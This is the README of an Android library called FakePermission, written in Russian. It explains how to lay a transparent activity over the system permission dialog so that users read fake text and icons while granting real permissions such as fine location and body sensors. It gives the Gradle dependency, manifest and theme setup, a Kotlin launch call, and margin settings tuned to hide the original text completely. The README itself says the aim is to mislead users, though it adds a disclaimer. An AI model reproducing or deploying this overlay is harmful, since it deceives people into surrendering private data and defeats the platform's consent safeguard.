# FakePermission
Android Fake Permission Tool

Библиотека предоставляет возможность перекрывать системный диалог выдачи разрешений начиная с Android 7.1.1 (Api 25). Таким образом вы сможете незаметно для конечного пользователя выдавать вашему приложению нужные разрешения, вводя пользователя в заблуждение, заставляя его соглашаться с тем что он увидит, а не с тем, что будет в действительности.

**Все предоставляется как есть, и не призывает никого к использованию**

## Демонстрация работы библиотеки
<img src="Samples.gif" width="220" height="400"/>

## Подключение

Добавьте в build.gradle модуля вашего приложения
```
implementation 'com.vittach:fakepermission:1.0.4'
```
Создайте стиль
```
<style name="Theme.Transparent" parent="AppTheme">
    <item name="android:windowBackground">@android:color/transparent</item>
    <item name="android:windowIsTranslucent">true</item>
</style>
```
Укажите активити в файле манифеста
```
<activity
    android:name="com.vittach.fakepermission.PermissionActivity"
    android:theme="@style/Theme.Transparent" />
```
## Настройка и пример использования

Для активации библиотеки необходимо запустить ее активити *PermissionActivity* и передать нужные конфигурационные параметры сразу строго ПОСЛЕ вызова системного диалога на выдачу пермишенов.

Если вы используете сторонние библиотеки для вызова системного диалога, как например такую на базе корутин:
```
com.sagar:coroutinespermission:1.0.0
```
То убедитесь, что корутина, в которой она будет вызываться имеет немедленный диспетчер: Dispatchers.Main.immediate.

Порядок появления диалогов очень важен, поскольку FakePermission по своей сути просто перекрывает системный диалог.
```
startActivity(
    Intent(this, PermissionActivity::class.java)
        .apply {
            putExtra(ORIGIN_PERMISSIONS, originPermissions)
            putExtra(FAKE_PERMISSIONS, fakePermissions)
            putExtra(FAKE_ICONS, fakeIcons)
            
            putExtra(ACCENT_COLOR, getColor(R.color.accentColor))
            putExtra(TEXT_COLOR, getColor(R.color.textColor))
            putExtra(FONT_FAMILY, "sans-serif")
            putExtra(FIRST_SHOWN, true)
            
            putExtra(PORTRAIT_BOTTOM_MARGINS, portraitBottomMargins)
            putExtra(LAND_BOTTOM_MARGINS, landBottomMargins)
            putExtra(PORTRAIT_WIDTHS, portraitWidths)
            putExtra(LAND_WIDTHS, landWidths)
        }
)
```
#### Обязательные конфигурационные параметры:
* **ORIGIN_PERMISSIONS**
    ```
    val originPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.BODY_SENSORS,
        ...
    )
    ```
* **FAKE_PERMISSIONS**

    Массив строк, текст которых будет отображаться поверх реального. Размерность массива должна совпадать с массивом *originPermissions*.
    Если кастомный текст по числу строк будет больше чем исходный, то он будет обрезан.

    ```
    val fakePermissions: Array<String> = arrayOf(
        getString(R.string.permission_fine_location_fake),
        getString(R.string.permission_body_sensors_fake),
        ...
    )
    ```
#### Необязательные конфигурационные параметры:
Вы можете настраивать отступы снизу и по бокам для каждого из выдаваемых пермишенов по порядку их запроса так, чтобы добиться полного перекрытия исходного текста. Поддерживается настройка как для портретной так и ландшафтной ориентации.
* **PORTRAIT_BOTTOM_MARGINS**
    ```
    val portraitBottomMargins: Array<Int> = arrayOf(
        50f.pxFromDp(this),
        32f.pxFromDp(this),
        ...
    }
    ```
* **PORTRAIT_WIDTHS**
* **LAND_BOTTOM_MARGINS**
* **LAND_WIDTHS**

Вы также можете установить свои иконки для каждого из запрашиваемых разрешений. При этом размерность массива может не совпадать с массивом *originPermissions*, в таком случае в качестве иконки, когда очередь дойдет, будет использоваться последняя.
* **FAKE_ICONS**
    ```
    val fakeIcons: Array<Int> = arrayOf(
        R.drawable.ic_location,
        R.drawable.ic_anchor,
        ...
    )
    ```
* **FIRST_SHOWN** - добавление или сокрытие из макета чекбокса (Don't ask again)
* **ACCENT_COLOR** - используется для тинтования иконки
* **TEXT_COLOR** - используется приминительно к тексту
* **FONT_FAMILY** - поддерживаются стандартные шрифты

